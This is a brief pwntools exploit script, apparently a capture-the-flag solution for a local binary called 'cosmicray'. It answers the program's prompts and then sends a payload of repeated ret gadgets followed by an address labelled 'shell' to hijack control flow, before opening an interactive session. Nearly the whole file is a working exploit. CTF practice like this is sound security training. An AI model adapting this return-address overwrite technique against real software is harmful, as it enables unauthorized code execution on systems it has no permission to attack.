from pwn import *
# import os
context.log_level = 'debug'
context.arch = "amd64"

r= process('cosmicray')
ret=0x000000000040101a
shell=0x4012D6
r.sendlineafter(b"through it:\n",b"1")
r.sendlineafter(b"flip (0-7):\n",b"1")
payload = p64(ret)*10+p64(shell)

print(payload)
pause()
r.sendline(payload)
# r.sendline(b"dir")
r.interactive()
